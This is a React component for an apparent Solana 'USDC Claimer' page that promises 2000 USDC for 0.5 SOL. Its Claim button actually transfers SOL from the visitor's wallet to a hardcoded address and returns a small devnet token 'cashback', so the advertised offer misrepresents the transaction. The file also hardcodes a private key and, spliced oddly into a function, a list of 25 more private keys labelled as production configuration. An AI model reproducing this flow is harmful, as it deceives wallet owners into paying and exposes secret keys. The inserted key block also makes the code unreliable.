/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "5F8ATYEfdv31LZoCauthJAiyEss6ikedyuxStrpTpfmrNrApgX6vrRyCZyJyBSBS6QucdeywX4nnBaozW2tih7kq"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "4bDwiqWXUEkVR4CDbokZSFY3mpHmN1MNp3212RDXcsAVRCsJBRaARBtJchsWzaB2R7YG3DQUUetvoGyAfufXSFcz",
  "key1": "5Hi2P1Kyz9HybAscL5zjopPDAFiCLtaKouMZrrnNAyZ8vtBJgJVeQPWYg863WrCS8eGC1WMEdn1NLaQGeJucL7Wg",
  "key2": "4vRz5WN8N7gfN2fURnye8XRicXmVWPz3NhJcLCBu1n6PjEhJ1Zd3F2sDqGa9HrUA8QV76j3Ksr3QC5mAd9wVDzZv",
  "key3": "2Fph99Ek6GcaYx7op15DYV17WupdKy8w52HkKPK6nQhTsFo7HaYrnJy2aTwofRWpMU4SSiVDUqUzQe3G8XH2eQxy",
  "key4": "4P7Hhehhk71FCEXeUUdGPZsSvi3Q936S8z9JkBhbRsrg4fv1F4ysyWezB25pVAWeB4jTDH3U1LdzYhxxqSt8DcpX",
  "key5": "2r9dsFuvX5FUkFN1QhhBwGRmaWDFog9LmMcHPbEeHohEEc7kdHMVNzvab38ic43QQ1gXJwdnCmfPSSECAbMDZZj9",
  "key6": "2cjfGQDzrsYSaKiETk77p9VaSUZHqy5VYiygysY5M7rAuEms1RT7YukPQ1UtBoPpUuoK1EidbHW32Yrf7A1CpyAT",
  "key7": "5FzJw5HQvoGpAe3faoqCAXcgAW9wtozppd6PzFeijnTbSLUnGimqLw3gRwp8xJVDxHHixC8eJjXVwuGoxosvpcg4",
  "key8": "4Tatbz65NcKpG1WTZ3xSQHSDqsp5Sn59h4XxkWvWSiwR1rNt21XP8FKW36jT3FLXBoqJ8RCeAtY3qUNvvXdkSLAk",
  "key9": "5tctH2TVWdCKp6FbVdP1T14KJNG7ksuepaU5vBphuY7ntRAKuC4i1PyEdU8CjPsBsLqhm4rTcFao7G3bFziNidzG",
  "key10": "e32SrUiUv6W7vnZnZE4irdmNDHeWYekJ7D7gGc9cnta3faYWGFsd4ikGZtTibvPuPmLeLYNmqBMiDQ4nUb7pP5M",
  "key11": "4gmY8nUpvim3aKytT3U6TPAaUvscRgxPnUBM52KZHY2d6tPcvPfzsMuRhCBV3N1qwEMqG1EriHVYxtErAfkmUyXr",
  "key12": "4thtcvtG38RNWxzFmKsYwX6ghzx6iGSjDE2oK8objPXF4GR8LQqPRyPt9jugtKnd4acARhVrUg65fQ54ddNyaCqf",
  "key13": "3ucUC76z7PzWgMVfs2jFqgZ5ATums6krAMD2JkroXiA9EUh91orArc2iK9pKkFvri4oXyAxLjiVaFVva9E96Nnhr",
  "key14": "5CMB8F2GzkWsZazwv6k3Nnz9AVFSNzKs69JJPEiRxQhkWEvBowa8pCBKprm4zawwkaFruPwSP2HuW53zxxDbFHKG",
  "key15": "JgByPA6mM2KM9CPUFximGcrdBBQa8ZKgX99NwZ2UFbd52jzvp5LgxTgiVUqMrFjsxWeAMugeBrgh2FVpQaKaK7J",
  "key16": "5k9xG2njRYPZDrNJw4hDPasoCgpEpSXypAy4yANMuv2ZhfhS1Rg4tKk9ZZh8DxoVbydRJBpHxigVg2R7mvDAbAjw",
  "key17": "3dpvcV5e1TLjM1TPHpBXTA4nQe3tZzoK7DgJNngAn3MUmXYTfFHbEE8FKXFC1F8dih3Tc6Yvy6YV65ftgJ8SE5KD",
  "key18": "4zKUkeWn6ZeQ5cNNy6GMPD87oaDh1jvhqXfkppPyPSx6TBwbHqEiSV8ZCKk2mAyai3ZJwadGYJNNvt2F4fw3mRU2",
  "key19": "2oafhYiaugBtDiha91MryuvmsjxrPD2SAZA1EJ972jrFejdDZWoJ6QrC9DVUPnoa7PDwAosXz5YSg2ZamABsyG8K",
  "key20": "vrD6YeCez6VVxnJjetGdExzUQtr1b76KAJRCd8ncybnQHFoEu7ddNWFN3LrHaEQsJRFS8VKK3uwqzSgzGU9v9oL",
  "key21": "5QxxayVGuccSZFS9qy6gjAyfCphLLNuny4h6Xh6kjvxhLCSfksE9m49gRqK96xT4s9tD8GMZLD8XFi8TGVRi9Siw",
  "key22": "3PXJ1G32GmPgNm72qPLkikZCeNpHXpa6SfjQ8AsUkSuEEDSHjhTTiKAvLcjJFRSSYqFCvKT7do37ayvRDxb3c6BT",
  "key23": "4GPGUiH3tAfzwght2UvzNebELPSq823aK5Qqs1FBjFEoWPcUW8hn2AC9K7f5T5y72axyfJFLe7eXQKbCVEMS9EGD",
  "key24": "5RC2ujZa1DAhxsRYcqsXaZKcqfCitHcDj3a1beeTJNsbvG6HpbmRp79eACozFTNDFBh5VaLLvwdq8HG2RFyBDYYF"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
